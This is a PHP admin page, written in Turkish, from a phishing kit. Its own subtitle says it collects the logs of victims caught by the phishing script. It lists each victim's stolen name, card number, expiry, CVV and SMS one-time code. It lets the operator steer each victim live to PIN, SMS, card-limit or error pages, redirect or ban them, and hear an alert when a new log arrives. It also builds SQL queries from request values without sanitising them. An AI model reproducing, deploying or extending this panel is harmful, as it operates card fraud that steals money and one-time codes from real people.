<?php

date_default_timezone_set('Europe/Istanbul');
include("../chante.php");
$ip = $_SERVER['REMOTE_ADDR'];
$sorgula = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);
$Zaman = date('H:i');
session_start();
if(!isset($_SESSION["login"])){
  $ip = $_SERVER['REMOTE_ADDR'];
$db->query("DELETE FROM paneldekiler WHERE ip='$ip'");
header('Location:login.php');
}else{
  $ip = $_SERVER['REMOTE_ADDR'];
$db->query("UPDATE paneldekiler SET durum = 'LOGLAR' WHERE ip = '{$ip}'");  
if(isset($_GET['limit'])){
$limit = $_GET['limit'];
$db->query("insert into max (max) values ( '$limit')");
echo "<script>alert('Limit istendi!');</script>";
echo "<script>window.location.href='loglar.php';</script>";
}
if(isset($_GET['pin'])){
$pin = $_GET['pin'];
$db->query("insert into pin (pin) values ( '$pin')");
echo "<script>alert('Pin istendi!');</script>";
echo "<script>window.location.href='loglar.php';</script>";
}
if(isset($_GET['sms'])){
$sms = $_GET['sms'];
$db->query("insert into sms (sms) values ( '$sms')");
echo "<script>window.location.href='loglar.php';</script>";
}
if(isset($_GET['hata'])){
$hata = $_GET['hata'];
$db->query("insert into hata (hata) values ( '$hata')");
echo "<script>window.location.href='loglar.php';</script>";
}
if(isset($_GET['hatalisms'])){
$hatalisms = $_GET['hatalisms'];
$db->query("insert into sms2 (sms2) values ( '$hatalisms')");
echo "<script>alert('Hatalı SMS istendi!');</script>";
echo "<script>window.location.href='loglar.php';</script>";
}
if(isset($_GET['tebrik'])){
$tebrik = $_GET['tebrik'];
$db->query("insert into tebrik (tebrik) values ( '$tebrik')");
echo "<script>window.location.href='loglar.php';</script>";
}
if(isset($_GET['sil'])){
$sil = $_GET['sil'];
$db->query("DELETE FROM sazan WHERE id='$sil'");
echo "<script>window.location.href='loglar.php';</script>";
}
if(isset($_GET['ban'])){
$ban = $_GET['ban'];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ban));
$sehir = $ipdat->geoplugin_city;
$ulke = $ipdat->geoplugin_countryName;
$tarih = date('d.m.Y H:i');
$db->query("INSERT INTO ban SET ban=('$ban'),ulke=('$sehir' ' [$ulke]'),date=('$tarih')");
$db->query("DELETE FROM sazan WHERE ip='$ban'");
echo "<script>window.location.href='loglar.php';</script>";
}
if(isset($_GET['dondur'])){
$dondur = $_GET['dondur'];
$db->query("INSERT INTO back (back) values ('$dondur')");
echo "<script>alert('Kullanıcı Sayfanın başına gönderildi!');</script>";
echo "<script>window.location.href='loglar.php';</script>";
}
if(isset($_GET['go'])){
$go = $_GET['go'];
$go_ip = $_GET['go_ip'];
$db->query("UPDATE sazan SET go = '{$go}' WHERE ip = '{$go_ip}'");
echo "<script>alert('Kullanıcı belirttiğiniz sayfaya yönlendirildi!');</script>";
echo "<script>window.location.href='loglar.php';</script>";
}
if(isset($_GET['logout'])){
  $giren = $_SERVER['REMOTE_ADDR'];
  $db->query("DELETE FROM paneldekiler WHERE ip='$giren'");
  session_start();
  ob_start();
  session_unset();
  session_destroy();
  header('Location:login.php');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="refresh" content="<?= $sorgula['refresh'] ?>;loglar.php"><!-- <?= $sorgula['refresh'] ?> sn. -->
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<meta name="description" content="">
<meta name="author" content="">
<title>Admin Panel</title>
<style>

body {
  background-image: url('https://cdn.akamai.steamstatic.com/steam/apps/1332010/ss_e8f0cbd5efdba352e89c4cfcee3fe991a1e1be8a.1920x1080.jpg?t=1660855681');
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
}
</style>
<!-- Bootstrap Core CSS -->
<link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

<!-- Custom CSS -->
<link href="./css/adminnine_dark.css" rel="stylesheet">

<!-- Custom Fonts -->
<link href="./vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

<script type="text/javascript" src="https://code.jquery.com/jquery-1.9.1.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.5.1/moment.min.js"></script>

<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
<script type="text/javascript">
      $(window).load(function(){
        $(document).ready(function() {
          var interval = setInterval(function() {
            var momentNow = moment();
            $('#saat').html(momentNow.format('🕒 hh:mm:ss'));
          }, 100);
        });
      });
</script>
<style>
.chante {
  margin-top: 15px;
  text-align: center;
  font-size:2rem;
  color:white;
  font-family: 'Merienda', cursive;
  animation-name:glow;
  animation-duration:1s;
  animation-iteration-count:infinite;
  animation-direction:alternate;
}
@keyframes glow{
  from{text-shadow:0px 0px 5px #fff,0px 0px 5px #614ad3;}
  to{text-shadow:0px 0px 20px #fff,0px 0px 20px #614ad3;}
}

.Box{
  background:#63c77e;
  color:#fff; 
  padding:8px;
  float:center;
  text-align:center;
  left:0;
  font-weight:500;
  margin:0 auto;
  right:0;
  width:300px;
  border:1px solid black;
  position:fixed;
}

</style>
</head>

<body>
<div id="wrapper">
  <div class="navbar-default sidebar" >
    <div class="clearfix"></div>
    <div class="sidebar-nav navbar-collapse">
    <div class="chante">
    <span>deathfung</span>
    </div>
    <hr>
      <!-- user profile pic -->
      <div class="clearfix"></div>
      <!-- user profile pic -->
      <ul class="nav" id="side-menu">
        <li> <a href="index.php"><i class="fa fa-dashboard fa-fw"></i>İstatistik</a> </li>
        <li> <a href="loglar.php"><i class="fa fa-money fa-fw"></i>Loglar</a></li>
        <li> <a href="banlistesi.php"><i class="fa fa-ban fa-fw"></i>Ban Listesi</a></li>
        <li> <a href="ayarlar.php"><i class="fa fa-cog fa-fw"></i>Ayarlar</a></li>
        <li> <a href="?logout"><i class="fa fa-sign-out fa-fw"></i>Çıkış Yap</a></li>
      </ul>
    </div>
    <!-- /.sidebar-collapse --> 
  </div>
  <?php foreach($db->query('SELECT * from site') as $site){
    if($site['sound']=='1'){
        ?>
<audio id="audioplayer" autoplay=true>
			<source src="css/chante.mp3" type="audio/mpeg">
</audio>
<div id="Box">(<?=$Zaman?>) Yeni Log Geldi!</div>
   <?php
   $db->query("UPDATE site SET sound='0'");
    }
} ?>
  <!-- Page Content -->
  <div id="page-wrapper">
    <div class="row">
      <nav class="navbar navbar-default navbar-static-top" style="margin-bottom: 0">
        <ul class="nav navbar-top-links navbar-right">
        <div id="saat"></div>
        </ul>
      </nav>
    </div>
    <div class="row">
      <div class="col-md-12  header-wrapper" >
        <h1 class="page-header">💸 Loglar</h1>
        <p class="page-subtitle">Bu sayfada phishing scriptinize düşen sazanların logları tutulur.</p>
      </div>
      <!-- /.col-lg-12 --> 
    </div>
    <!-- /.row -->
    <div class="row">
      <div class="col-lg-12">
        <div class="panel panel-default">
          <!-- /.panel-heading -->
            <div class="panel-body">
          <table class="table " id="dataTables-example">
          <thead>
            <tr>
          <th>DURUM</th>
          <th>ID</th>
          <th>AD SOYAD</th>
          <th>KREDİ KARTI</th>	 
          <th>AY/YIL</th>
          <th>CVV</th> 
          <th>SMS</th>
          <th>Tarih</th>
          <th>IP(<?php
 $onlineList = [];
   $query = $db->query("SELECT * FROM ips", PDO::FETCH_ASSOC);
   if($query->rowCount()) {
	   foreach($query as $v) {
		   if($v['lastOnline'] > time()) {
			   array_push($onlineList, $v['ipAddress']);
		   }
	   }
   }
   echo count($onlineList);
  ?>)</th>
          <th>İŞLEM</th>
            </tr>
          </thead>
          <?php $sqla=$db->query('SELECT * FROM sazan ORDER BY id DESC'); ?>
          <tbody>
          <?php foreach($sqla as $oku) { ?>
            <tr>
              
            <td style="color:lightgreen;"><?php echo $oku['now']; ?></td>
              <td style="color:lightgreen;"><?php echo $oku['id']; ?></td>
              <td style="color:#28FF0F"><?php echo $oku['ad']; ?></td>
              <td style="color:#28FF0F"><?php echo $oku['phone']; ?></td>
              <td style="color:#28FF0F"><?php echo $oku['ay']; ?></td>
              <td style="color:#28FF0F"><?php echo $oku['yil']; ?></td>
              <td style="color:#28FF0F"><?php echo $oku['sms']; ?></td>
              <td style="color:#aaaaa"><?php echo $oku['date']; ?></td>
              <td style="color:#aaaaa"><?php echo $oku['ip']; ?><?=($oku['lastOnline'] > time() ? '🟢' : '🔴')?></td>
              <td style="padding:1px;color:white"><a href="?dondur=<?php echo $oku['ip']; ?>"><button class="btn btn-success btn-circle"><i class="fa fa-retweet"></i></button></a> <a href="?sms=<?php echo $oku['ip']; ?>"><button class="btn btn-success btn-circle"><i class="fa fa-comment"></i></button></a> <br><a href="?tebrik=<?php echo $oku['ip']; ?>"><button class="btn btn-success btn-circle"><i class="fa fa-check"></i></button></a> <a href="?hata=<?php echo $oku['ip']; ?>"><button class="btn btn-success btn-circle"><i class="fa fa-exclamation-triangle"></i></button></a> <a href="?ban=<?php echo $oku['ip']; ?>"><button class="btn btn-success btn-circle"><i class="fa fa-ban"></i></button></a> <a href="?sil=<?php echo $oku['id']; ?>"><button class="btn btn-success btn-circle"><i class="fa fa-trash"></i></button></a></tr>
          <?php } ?>
          </tbody>
        </table><!-- /.table-responsive -->           
            </div>  
            <!-- /.panel-body --> 
        </div>
        <!-- /.panel --> 
      </div>
      <!-- /.col-lg-12 --> 
    </div>
    
  <!-- /#page-wrapper --> 
</div>
<!-- /#wrapper -->
<!-- jQuery --> 
<script src="./vendor/jquery/jquery.min.js"></script> 
<!-- Bootstrap Core JavaScript --> 
<script src="./vendor/bootstrap/js/bootstrap.min.js"></script> 
<!-- Custom Theme JavaScript --> 
<script src="./js/adminnine.js"></script>
</body>
</html>
<?php } ?>